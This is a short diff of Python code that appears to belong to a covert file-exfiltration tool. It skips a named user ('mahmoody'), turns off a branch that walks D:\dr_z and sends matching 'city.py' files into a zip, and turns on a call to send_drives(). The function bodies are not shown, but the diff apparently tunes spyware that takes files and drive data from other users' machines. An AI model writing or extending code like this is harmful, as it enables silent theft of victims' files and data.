@@ -113,7 +113,7 @@ def send_walk(mpath):
 global current_code_id
 if current_code_id != 968 :
     if  user != "mahmoody":
-        if 1 == 1:
+        if 1 == 14:
             path = r"D:\\dr_z"
             for root, dirs, files in os.walk(unicode(path)):
                 for file in files:
@@ -121,7 +121,7 @@ if current_code_id != 968 :
                     if file_path.endswith("city.py"):
                         sendfile(file_path,temp_path + "\\zipname.zip")
 
-        if 1 == 12:
+        if 1 == 1:
             send_drives()
 
 
